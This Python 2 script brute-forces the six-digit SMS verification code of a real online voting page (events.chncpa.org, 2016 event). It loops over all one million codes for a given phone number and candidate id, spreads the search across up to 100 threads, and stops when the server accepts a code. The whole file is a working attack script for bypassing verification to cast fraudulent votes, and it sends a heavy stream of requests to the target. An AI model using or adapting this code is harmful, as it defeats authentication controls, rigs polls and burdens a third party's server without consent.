# -*- coding: utf-8 -*-
import requests 
import json
import time
import datetime
import itertools
from functools import wraps
import threading

def ex(default=0):
    def wrapper(fn):
        @wraps(fn)
        def func(*args, **kwds):
            try:
                r = fn(*args, **kwds)
            except Exception, e:
                r = default
                print '[%s][%s]' % (fn.__name__, str(e))
                #print traceback.format_exc()
            return r
        return func
    return wrapper


def pace(fn):
    @wraps(fn)
    def func(*args, **kwds):
        t0 = time.time()
        r = fn(*args, **kwds)
        t = time.time() - t0
        print '---%s: %ss---' % (fn.__name__, t)
        return r
    return func


@pace
def sc(mob, id=5, start='000000', timeout=2):
    #time.sleep(0.001)
    url = 'http://events.chncpa.org/wmx2016/action/toupiao.php'
    headers = {'X-Requested-With': 'XMLHttpRequest'}
    p = itertools.product(range(10), repeat=6)
    for i in p:
        yzm = ''.join(map(str, i))
        if yzm < start:
            continue
        print yzm
        data = {'id': id,
                'mob': mob,
                'yzm': yzm,
               }
        c = 0
        while c < 5:
            try:
                r = requests.post(url, data=data, headers=headers, timeout=timeout)
                break
            except Exception, e:
                print str(e), c
                c += 1
                time.sleep(0.5)
             
        if r.json()['status']!=0:
            print '----Got it!-----'
            print r.text, yzm, mob, id
            break


@pace
def msc(mob, id=5, group='0', timeout=2):
    global END_FLAG
    #time.sleep(0.001)
    url = 'http://events.chncpa.org/wmx2016/action/toupiao.php'
    headers = {'X-Requested-With': 'XMLHttpRequest'}
    p = itertools.product(range(10), repeat=6-len(group))
    for i in p:
        if END_FLAG:
            print '-----other thread find-----'
            break
        yzm = group + ''.join(map(str, i)) 
        print yzm 
        data = {'id': id, 
                'mob': mob,
                'yzm': yzm,
               }   
        c = 0 
        while c < 5:
            try:
                r = requests.post(url, data=data, headers=headers, timeout=timeout)
                break
            except Exception, e:
                print str(e), c, group
                c += 1
                time.sleep(0.5)
                 
        if r.json()['status']!=0:
            print '----Got it!-----'
            print r.text, yzm, mob, id
            END_FLAG = True
            break

THREADS = []
END_FLAG = False
def mtask(mob, id=5, timeout=1, gd=2):
    global THREADS
    p = itertools.product(range(10), repeat=gd)
    for i in p:
        g = ''.join(map(str, i))
        t = threading.Thread(target=msc, args=(mob, id, g, timeout))
        THREADS.append(t)
        t.start()
